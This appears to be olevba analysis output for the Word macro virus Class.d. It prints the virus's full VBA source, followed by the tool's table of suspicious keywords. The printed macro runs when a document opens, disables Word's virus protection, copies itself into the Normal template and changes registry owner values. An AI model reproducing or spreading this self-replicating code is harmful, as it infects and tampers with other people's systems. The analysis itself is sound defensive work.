olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-5502d079a9a7403e9f0dd751342b555f77d724c8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-5502d079a9a7403e9f0dd751342b555f77d724c8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
Const REG_SZ As Long = 1
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
Const HKEY_CURRENT_USER As Long = &H80000001
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
Sub AutoOpen()
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
On Error GoTo out
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
Options.VirusProtection = False
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
Options.SaveNormalPrompt = False
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
Options.ConfirmConversions = False
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
If nt > 70 And ad > 0 Then GoTo out
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
If nt < 70 Then
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
End If
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
host.codemodule.AddFromFile ("c:\class.sys")
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
With host.codemodule
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    For x = 1 To 16
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    .deletelines 1
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    Next x
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
End With
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
If nt < 70 Then
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    With host.codemodule
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    .replaceline 1, "Sub AutoClose()"
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    .replaceline 91, "Sub ToolsMacro()"
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    For x = 70 To 81
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
        .deletelines 62
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    Next x
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    .replaceline 35, "    For x = 1 To 4"
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    End With
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
End If
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
If nt < 70 Then
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
u = RegCloseKey(k)
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
End If
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
With host.codemodule
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    For x = 2 To 104 Step 2
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'g21profile29/10/98 15:00:44\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
    Next x
'g21profile29/10/98 15:00:45\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
End With
'g21profile29/10/98 15:00:45\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
out:
'g21profile29/10/98 15:00:45\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'g21profile29/10/98 15:00:45\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
End Sub
'g21profile29/10/98 15:00:45\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
Sub ViewVBCode()
'g21profile29/10/98 15:00:45\\ANGOURIE\Angourie copg21lw on NE00:FINAL.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
